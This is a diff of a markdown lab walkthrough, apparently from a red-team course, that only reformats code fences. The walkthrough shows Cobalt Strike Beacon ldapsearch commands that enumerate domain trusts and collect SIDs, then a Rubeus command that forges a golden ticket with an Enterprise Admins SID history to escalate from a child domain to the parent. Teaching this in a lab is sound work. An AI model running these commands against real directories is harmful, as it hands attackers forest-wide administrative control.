@@ -7,9 +7,9 @@
 1. Launch Cobalt Strike and connect to the team server.
 2. Interact with the Beacon and enumerate the trust.
 
-    ```Beacon-nocolor
-    ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
-    ```
+```Beacon-nocolor
+ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+```
 
 ⚠️ results
  
@@ -18,17 +18,17 @@
 
 3. Obtain the domain SID for the child domain.
 
-	```Beacon-nocolor
-    ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
-    ```
+```Beacon-nocolor
+ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
+```
 
 ⚠️ This should return *S-1-5-21-690277740-3036021016-2883941857*.
 
 4. Obtain the SID for parent domain's Enterprise Admins group.
 
-	```Beacon-nocolor
-    ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
-    ```
+```Beacon-nocolor
+ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
+```
 	
 ⚠️ This should return *S-1-5-21-3926355307-1661546229-813047887-519*.
 
@@ -81,9 +81,9 @@ Credentials
 
 1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file in powershell terminal.
 
-    ```Terminal-nocolor
-    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
-    ```
+```Terminal-nocolor
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
+```
 
 <img src="/images/powershell_Rubeus_golden_dublin_output.png">  
 
